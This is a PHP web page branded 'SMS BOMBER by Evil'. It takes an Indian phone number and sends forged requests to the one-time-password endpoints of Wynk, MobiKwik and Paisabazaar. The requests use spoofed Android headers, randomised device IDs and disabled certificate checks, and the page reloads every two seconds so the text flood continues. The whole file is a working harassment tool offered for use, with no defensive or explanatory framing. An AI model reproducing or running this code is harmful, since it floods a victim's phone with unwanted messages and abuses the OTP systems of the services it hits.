
<?php


 echo '<!DOCTYPE html>
    <html>
     <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
        <link rel="shortcut icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbC2bMbwW6w1y_EEnlMEcNnpVZiBZpdNBHuuCtuzEMObx5ISIGQw" />
        <link rel="stylesheet" href="/style.css">
        <title>
            SMS BOMBER by Evil
        </title>
    </head>

    <body>
        <center>
            <h1 style="color:red">Sms Bomber </h1><h2> <font color="orange">MR </font><font color="white">Pratik <font><font color="green">Pathak</font></h2>
</html>';
function CURLPOST($url, $headers, $postdata){						//CURL function to send post requests.

	$ch=curl_init($url);
			
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POST, TRUE);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); 

	$response=curl_exec($ch);

}

function CURLGET($url, $headers){									//CURL function to send get requests.

	$ch=curl_init($url);
			
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POST, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); 

	 $response=curl_exec($ch);

}
if(!isset($_GET['no'])){
echo '<!DOCTYPE html>
    <html>

    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
        <link rel="shortcut icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbC2bMbwW6w1y_EEnlMEcNnpVZiBZpdNBHuuCtuzEMObx5ISIGQw" />
        <link rel="stylesheet" href="http://www.blackhets.tk/style1.css">
        <title>
            SMS BOMBER by Evil
        </title>
    </head>

    <body>
        <center>
            <h1 style="color:red">Sms BomBer</h1><h2> <font color="orange"> Mr </font><font color="white">Pratik </font><font color="green">Pathak</font></h2>

        </center>
        <div class="mainbox">


            <form method="GET" action="" id="submit">
                <div class="cen ">
                    <div id="sqre" class="height">
                        <input type="text" style="color:red" class="in" value=" +91 " multiple>
                        <input type="number" class="in"  style="color:red" name="no" placeholder="ENTER NUMBER" required>
                        <div id="cir1">

                        </div>
                        <div id="cir2">

                            <input type="submit" value=" SUBMIT " class="submit">


<div class="footer">
            <h2 style="color:red">Created by : PratikPathak <font color="red"></h2>
        </div>
    </body>
</html>'; }
if(isset($_GET['no'])){
$no = $_REQUEST['no'];



############################### WYNK ###########################
$po=$_GET['no'];
$url = 'https://secure.wynk.in/music/v2/account/otp';
$headers = array('Content-Type: application/json; charset=utf-8','User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0; BLN-L22 Build/HONORBLN-L22)','Host: secure.wynk.in','Connection: Keep-Alive','Accept-Encoding: gzip');
$postdata = '{"msisdn":"'.$no.'"}';
	
	$result = CURLPOST($url, $headers, $postdata);
	

############################### WYNK ###########################

############################# MOBIKWIK #########################
$random=rand(1111,9999);
$random1=rand(11111,99999);
$random2=rand(111111,999999);
$deviceId=''.$random.'6E1C95FB7CF8B6'.$random.'94E1EF796ADFC'.$random.'';
$userid=''.$random.'2ec-d5bb-4a2b-9d83-'.$random.'2d5da35';
$no=$_GET['no'];
$url = 'https://appapi.mobikwik.com/p/account/otp/cell';
$headers = array('X-Device-ID: $token','Content-Type: application/json','X-tune-limited-flag: 0','X-tune-user-ID: $userid','X-App-Ver: 374','X-MClient: 3','Content-Type: application/json; charset=utf-8','User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0; BLN-L22 Build/HONORBLN-L22)','Host: appapi.mobikwik.com','Connection: Keep-Alive','Accept-Encoding: gzip');
$postdata = '{"cell":"'.$no.'"}';
$result = CURLPOST($url, $headers, $postdata);

############################# PAISABAXAR #########################

$jo=$_GET['no'];
$url = 'https://api2.paisabazaar.com/BSP/api/v1/visitor';
$postdata = "{\"visitId\":\"xxxxxxxx-2a35-4003-a03c-83d075622687\",\"mobileNumber\":\"$jo\"}";
	
$headers = array('Content-Type: application/json; charset=utf-8','User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0','Accept: application/json, text/plain, */*','Accept-Language: en-US,en;q=0.5','Host: api2.paisabazaar.com','Connection: Keep-Alive','Content-Length: 78','Accept-Encoding: gzip, deflate','Referer: https://creditreport.paisabazaar.com/bureau/login?utm_source=pb_header_signin_veto','Origin: https://creditreport.paisabazaar.com','Accept-Encoding: gzip','Connection: close');

	$result = CURLPOST($url, $headers, $postdata);


echo '<h1 style="color:red">Sms Bomber Started</h1><h2> <font color="orange">Mr</font><font color="white">Pratik</font><font color="green">Pathak</font></h2>';

"<br></center>";
header("refresh: 2;");

}
?>